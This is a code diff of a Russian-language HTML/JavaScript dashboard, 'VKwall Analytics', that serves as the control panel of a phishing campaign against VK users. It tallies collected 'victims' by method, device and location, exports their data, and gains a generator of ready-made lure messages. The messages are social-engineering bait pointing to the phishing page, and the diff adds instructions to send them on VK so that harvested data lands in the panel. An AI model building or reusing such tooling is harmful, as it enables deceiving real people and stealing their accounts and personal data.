@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VK Analytics Dashboard</title>
+    <title>VKwall Analytics Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -26,6 +26,8 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
         }
         
         .logo { 
@@ -251,7 +253,7 @@
         
         .method-stats {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 1rem;
             margin: 1rem 0;
         }
@@ -288,24 +290,60 @@
             margin-top: 1rem;
             text-align: center;
         }
+        
+        .link-generator {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+        }
+        
+        .url-display {
+            background: #1a1a1a;
+            padding: 0.7rem;
+            border-radius: 6px;
+            margin: 1rem 0;
+            border: 1px solid #333;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        
+        .copy-btn {
+            background: #4a76a8;
+            color: white;
+            border: none;
+            padding: 0.3rem 0.7rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            margin-left: 0.5rem;
+        }
+        
+        .message-box {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 1rem;
+            border-radius: 6px;
+            margin: 0.5rem 0;
+            border-left: 3px solid #4a76a8;
+        }
     </style>
 </head>
 <body>
     <div class="dashboard">
         <div class="header">
-            <div class="logo">📊 VK Analytics Dashboard</div>
+            <div class="logo">📊 VKwall Analytics</div>
             <div class="controls">
                 <button class="btn" onclick="loadAllData()">
-                    <span>🔄</span> Обновить данные
+                    <span>🔄</span> Обновить
                 </button>
                 <button class="btn" onclick="exportAllData()">
                     <span>📤</span> Экспорт JSON
                 </button>
                 <button class="btn" onclick="openWebhook()">
-                    <span>🌐</span> Webhook панель
+                    <span>🌐</span> Webhook
                 </button>
                 <button class="btn danger" onclick="clearAllData()">
-                    <span>🗑️</span> Очистить все
+                    <span>🗑️</span> Очистить
                 </button>
             </div>
         </div>
@@ -333,7 +371,7 @@
             <button class="filter-btn active" onclick="setFilter('all')">Все методы</button>
             <button class="filter-btn" onclick="setFilter('app')">📱 Приложение</button>
             <button class="filter-btn" onclick="setFilter('site')">🌐 Сайт</button>
-            <button class="filter-btn" onclick="setFilter('click')">🎥 Клик по видео</button>
+            <button class="filter-btn" onclick="setFilter('click')">🎥 Клик</button>
             <button class="filter-btn" onclick="setFilter('auto')">🤖 Авто</button>
         </div>
         
@@ -345,6 +383,10 @@
             <div class="method-stat">
                 <div class="method-value" id="siteCount">0</div>
                 <div class="method-label">Сайт</div>
+            </div>
+            <div class="method-stat">
+                <div class="method-value" id="clickCount">0</div>
+                <div class="method-label">Клик</div>
             </div>
             <div class="method-stat">
                 <div class="method-value" id="autoCount">0</div>
@@ -380,7 +422,7 @@
             </div>
             
             <div class="section">
-                <div class="section-title">📱 Устройства и браузеры</div>
+                <div class="section-title">📱 Устройства</div>
                 <div id="deviceStats">
                     <table class="data-table">
                         <thead>
@@ -404,6 +446,25 @@
                 </div>
             </div>
         </div>
+
+        <!-- Генератор ссылок -->
+        <div class="section" style="margin: 2rem;">
+            <div class="section-title">🔗 Генератор VK-ссылок</div>
+            <div class="link-generator">
+                <div style="margin-bottom: 1rem;">
+                    <strong>Текущая фишинг-ссылка:</strong>
+                    <div class="url-display" id="currentUrl">Загрузка...</div>
+                </div>
+                
+                <button onclick="generateVKLinks()" class="btn" style="width: 100%; margin-bottom: 1rem;">
+                    🎲 Сгенерировать VK-сообщения
+                </button>
+                
+                <div id="vkLinksResult">
+                    <!-- Здесь появятся сгенерированные ссылки -->
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -420,6 +481,12 @@
             'stealth_victims'       // Стелс данные
         ];
 
+        // Получить текущий URL фишинга
+        function getCurrentPhishingUrl() {
+            const currentUrl = window.location.href;
+            return currentUrl.split('/dashboard.html')[0] + '/';
+        }
+
         function loadAllData() {
             allVictims = [];
             
@@ -432,15 +499,9 @@
                         
                         // Добавляем источник к данным
                         const dataWithSource = data.map(item => {
-                            // Определяем тип кампании
-                            let campaign = 'other';
-                            if (key.includes('vk')) campaign = 'vk';
-                            if (key.includes('netflix')) campaign = 'netflix';
-                            
                             return {
                                 ...item,
                                 storageKey: key,
-                                campaign: campaign,
                                 displaySource: getDisplaySource(item, key)
                             };
                         });
@@ -457,6 +518,7 @@
             
             updateDashboard();
             updateLastUpdateTime();
+            updateCurrentUrl();
         }
         
         function getDisplaySource(victim, storageKey) {
@@ -528,17 +590,19 @@
                 'app': 0,
                 'site': 0, 
                 'click': 0,
-                'auto': 0,
-                'unknown': 0
+                'auto': 0
             };
             
             victims.forEach(victim => {
-                const method = victim.interaction?.method || victim.session?.method || 'unknown';
-                methods[method] = (methods[method] || 0) + 1;
+                const method = victim.interaction?.method || victim.session?.method;
+                if (method && methods.hasOwnProperty(method)) {
+                    methods[method]++;
+                }
             });
             
             document.getElementById('appCount').textContent = methods.app;
             document.getElementById('siteCount').textContent = methods.site;
+            document.getElementById('clickCount').textContent = methods.click;
             document.getElementById('autoCount').textContent = methods.auto;
         }
         
@@ -595,8 +659,6 @@
         
         function showVictimDetails(victim) {
             const viewer = document.getElementById('jsonViewer');
-            
-            // Форматируем JSON для лучшей читаемости
             const formattedData = JSON.stringify(victim, null, 2);
             viewer.textContent = formattedData;
         }
@@ -613,8 +675,7 @@
                         locations[key] = {
                             country: location.country,
                             city: location.city || 'Неизвестно',
-                            count: 0,
-                            ip: location.ip
+                            count: 0
                         };
                     }
                     locations[key].count++;
@@ -719,7 +780,7 @@
         
         function getTotalDataPoints(victims) {
             return victims.reduce((total, victim) => {
-                return total + (Object.keys(victim).length * 3); // Примерный расчет
+                return total + (Object.keys(victim).length * 3);
             }, 0);
         }
         
@@ -739,13 +800,76 @@
                 `Последнее обновление: ${new Date().toLocaleString('ru-RU')}`;
         }
         
+        function updateCurrentUrl() {
+            document.getElementById('currentUrl').textContent = getCurrentPhishingUrl();
+        }
+        
+        function generateVKLinks() {
+            const phishingUrl = getCurrentPhishingUrl();
+            
+            // Сообщения для отправки
+            const messages = [
+                `Привет! Посмотри что нашел на стене 😊\n${phishingUrl}`,
+                `На стене интересное видео появилось!\n${phishingUrl}`,
+                `Зацени запись на стене! 👀\n${phishingUrl}`,
+                `Срочно! На стене появилось это!\n${phishingUrl}`,
+                `Это напомнило мне о тебе) Смотри на стене\n${phishingUrl}`,
+                `Ребята, это просто бомба! 💥\n${phishingUrl}`,
+                `Ты должен это увидеть! 🎥\n${phishingUrl}`,
+                `Вот это поворот! 😱\n${phishingUrl}`
+            ];
+            
+            let resultHTML = `
+                <div style="margin-bottom: 1.5rem;">
+                    <h4 style="color: #4a76a8; margin-bottom: 0.5rem;">💬 Готовые сообщения для VK:</h4>
+                    ${messages.map(msg => `
+                        <div class="message-box">
+                            <div style="color: #ccc; margin-bottom: 0.5rem; white-space: pre-line;">${msg}</div>
+                            <button onclick="copyToClipboard('${msg.replace(/\n/g, '\\n')}')" class="copy-btn">Копировать сообщение</button>
+                        </div>
+                    `).join('')}
+                </div>
+                
+                <div style="margin-top: 1rem; padding: 1rem; background: rgba(74, 118, 168, 0.1); border-radius: 6px;">
+                    <strong>💡 Как использовать:</strong>
+                    <ul style="color: #ccc; margin-top: 0.5rem; padding-left: 1.5rem;">
+                        <li>Копируйте сообщения и отправляйте в VK</li>
+                        <li>Ссылка автоматически откроет фишинг-страницу VKwall</li>
+                        <li>Жертва увидит реалистичную VK-страницу</li>
+                        <li>Данные автоматически поступят в эту панель</li>
+                    </ul>
+                </div>
+            `;
+            
+            document.getElementById('vkLinksResult').innerHTML = resultHTML;
+        }
+        
+        function copyToClipboard(text) {
+            const cleanText = text.replace(/\\n/g, '\n');
+            
+            navigator.clipboard.writeText(cleanText).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '✅ Скопировано!';
+                btn.style.background = '#28a745';
+                
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.background = '#4a76a8';
+                }, 2000);
+            }).catch(err => {
+                console.error('Ошибка копирования:', err);
+                alert('Ошибка копирования');
+            });
+        }
+        
         function exportAllData() {
             const dataStr = JSON.stringify(allVictims, null, 2);
             const blob = new Blob([dataStr], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
             const link = document.createElement('a');
             link.href = url;
-            link.download = `vk_analytics_${new Date().toISOString().split('T')[0]}.json`;
+            link.download = `vkwall_analytics_${new Date().toISOString().split('T')[0]}.json`;
             link.click();
             URL.revokeObjectURL(url);
         }
@@ -769,7 +893,10 @@
         setInterval(loadAllData, 15000);
         
         // Первая загрузка при открытии
-        document.addEventListener('DOMContentLoaded', loadAllData);
+        document.addEventListener('DOMContentLoaded', function() {
+            loadAllData();
+            setTimeout(generateVKLinks, 1000);
+        });
         
     </script>
 </body>
